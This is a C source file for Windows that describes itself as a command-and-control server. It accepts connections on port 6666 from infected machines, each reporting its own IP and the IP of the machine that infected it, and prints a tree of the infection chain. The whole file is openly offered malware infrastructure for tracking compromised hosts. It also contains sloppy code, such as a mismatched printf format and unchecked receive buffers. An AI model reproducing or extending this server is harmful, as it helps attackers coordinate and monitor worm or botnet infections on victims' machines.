//	Server.c
//	Programmer:	Daniel L.

//	This is a C&C server program that gets two messages from the client and catalouges the inforation
//	int a data structure.

//	The server establishes a socket connection to the local ip on a hardcoded port (macro PORT), and 
//	waits for connections on an infinite loop.
//	The new connection process time can be configured using SLEEP_TIME. it dictates the time between
//	proessing cycles, measured in miliseconds (ms).

//	Once recieving a connction it will attempt to accept it and recieve two messages from the client machine.
// 	1. it's ip.
//	2. it's corruptor's ip.

//	It will then keep it in a linked list structure under a single root node.
//	Each processing cycle it will print the current node tree/linked list.

#include	<stdio.h>
#include	<string.h>
#include	<stdlib.h>
#include	<WinSock2.h>
#include	<ws2tcpip.h>

#define		SUCCESS			1
#define		FAILURE			0
#define		xalloc(type)	(type *) malloc(sizeof(type))	// Universal memory allocation macro.

#define		DMUL			5		// Multipler value used for the amount of dashes in the sub-arrow.
#define 	BUFFLEN			255		// The size of the buffer for recieving messages from clients.
#define		SLEEP_TIME		500		// The sleep time between processing cycles.

#define		ROOT_IP			""		// The display string for the original node in the list.
#define		PORT			6666	// The port to bind to.
#define		MAXQUE			10		// Max amount of machine that can queue to get accepted.


#pragma 	comment(lib, "Ws2_32.lib")

typedef struct vnode {	/* STRUCTURE represents victim machine. */ 
	char				*ip;			/* The ip of the victim. */
	struct vnode		*corruptor;		/* The node of the machine that infected this machine. */
	struct vnode		*victims;		/* The node of a machine infected by this machine. THIS IS A NODE CHAIN ARCHITECTURE. */
	struct vnode		*next;			/* The node of the next machine. */
} vnode;
typedef vnode *vptr;


struct sockaddr_in srvAddr;
fd_set fr, fw, fe;
struct timeval tv;
vptr rootNode;
WSADATA ws;
int nMaxFd;
int selRet;


int addNode(vptr a, vptr b, char* c);
vptr vcreate(char* a);
void vprint(vptr a, int b);
void processRequest(SOCKET a);
void arrow(int a);


int main(int argc, char* argv[])
{
	clrscr();

	// Initialize the windows socketing API.
	if((WSAStartup(MAKEWORD(2,2), &ws)) != 0)
	{
		printf("[-] WSAStartup failed to initialize.\n");
		return FAILURE;
	}
	else
	{
		printf("[+] WSAStartup initialized successfuly.\n");
	}

	// Create the socket
	int newSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (newSocket < 0)
	{
		printf("[-] Socket failed to create.\n");
		return FAILURE;
	}
	else
	{
		printf("[+] Socket created successfuly.\n");
	}

	// Get the address info required for the socket.
	srvAddr.sin_family = AF_INET;
	srvAddr.sin_port = htons(PORT);
	srvAddr.sin_addr.s_addr = INADDR_ANY;
	memset(srvAddr.sin_zero, 0, 8);

	// Bind the socket to the local port.
	if((bind(newSocket, (struct sockaddr *) &srvAddr, sizeof(struct sockaddr)) == SOCKET_ERROR))
	{
		printf("[-] Socket failed to bind.\n");
		WSACleanup();
		return FAILURE;
	}
	else
	{
		printf("[+] Socket bound successfuly.\n");
	}

	// Listen to incoming connections.
	if((listen(newSocket, MAXQUE)) < 0)
	{
		printf("[-] Socket failed to start listneing.\n\n");
		WSACleanup();
		return FAILURE;
	}
	else
	{
		printf("[+] Socket started listening on port successfuly.\n");
	}

	// Process socket Fds.
	tv.tv_sec = 1;
	tv.tv_usec = 0;

	// Create the root Node.
	rootNode = vcreate(ROOT_IP);
	nMaxFd = newSocket;

	while (1)
	{
		clrscr();
		
		FD_ZERO(&fr);
		FD_ZERO(&fw);
		FD_ZERO(&fe);

		FD_SET(newSocket, &fr);
		FD_SET(newSocket, &fe);

		selRet = select(nMaxFd + 1, &fr, &fw, &fe, &tv);
		if (selRet > 0)
		{

			// There are sockets ready for action.
			printf("\n+ There are sockets ready for action.\n\n");
			
			processRequest(newSocket);
		}
		else if (selRet == 0)
		{

			// There are no ready sockets.
			printf("\n- No sockets are ready for action.\n");
		}
		else
		{

			// The select function failed.
			printf("\n# The select function failed.\n");
			WSACleanup();
			return(FAILURE);
		}

		vprint(rootNode, 0);

		Sleep(SLEEP_TIME);
	}
}


void processRequest(SOCKET sock)
{
	if (FD_ISSET(sock, &fr))
	{
		struct sockaddr_in clientSockaddr;
		int size = sizeof(struct sockaddr);

		int clientSocket = accept(sock, (struct sockaddr*)&clientSockaddr, &size);
		if (clientSocket > 0)
		{
			// The new connection was accepted.
			char *buffMachine = (char*)calloc(BUFFLEN, sizeof(char));
			char *buffParent = (char*)calloc(BUFFLEN, sizeof(char));

			recv(clientSocket, buffMachine, BUFFLEN, 0);
			recv(clientSocket, buffParent, BUFFLEN, 0);
			printf("%s | %s \n\n", buffMachine, buffParent);

			vptr newNode = vcreate(buffMachine);
			addNode(rootNode, newNode, buffParent);
		}
		else
		{
			printf("Faield to accept the new connection. code:%s\n", WSAGetLastError());
		}
	}
}

vptr vcreate(char *ip) /* vcreate: Create a new vnode and return it. */ 
{
	vptr newNode = xalloc(vnode);
	newNode->ip = ip;
	newNode->victims = NULL;
	newNode->next = NULL;
	newNode->corruptor = NULL;

	return newNode;
}


int addNode(vptr current, vptr victim, char *parentIp) /* addNode: Add a node to the curription tree. return execution code: 1 = success, 0 = failure */
{
	if(strcmp(victim->ip, "") != 0 && strcmp(parentIp, "") == 0) // If no corruptor ip was give, the machine is inherently evil.
	{
		
		// Attach the new evil mavhine to the 'next' node chain.
		victim->next = current->next;
		current->next = victim;
		return SUCCESS;
	}

	if(strcmp(current->ip, parentIp) == 0) // If the current node is the corruptor.
	{

		// Attach the victim node to the beginning of the infected chain of the corruptor.
		victim->next = current->victims;
		victim->corruptor = current;
		current->victims = victim;
		return SUCCESS;
	}

	if(current->victims != NULL) // Keep looking in the current node's infected chain.
		addNode(current->victims, victim, parentIp);
	if(current->next != NULL) // Keep looking in the next node in the current infected chain.
		addNode(current->next, victim, parentIp);

	return FAILURE; // Returns if all recurssion fail
}

void vprint(vptr current, int depth) /* vprint: Print the tree structure from the given root node, prints all infected then nexts w/ indentation. */
{
	if (depth > 0) 							// Print an arrow if needed.
		arrow(depth);
	if	(strcmp(current->ip, "") != 0) 		// Only print node ip if it has a value.
		printf("[%s]\n", current->ip); 
	if(current->victims != NULL) 			// Print all victims first.
		vprint(current->victims, depth + 1);
	if(current->next != NULL) 				// Print next same-depth machines last.
		vprint(current->next, depth);
}


void arrow(int i) /* arrow: print an indented arrow, used to prefix a machine in [vprint] */
{
	for(; --i > 0 ;)
		putchar('\t');
	putchar('\'');
	for(i = DMUL; i > 0 ; i--)
		putchar('-');
	putchar('>');
}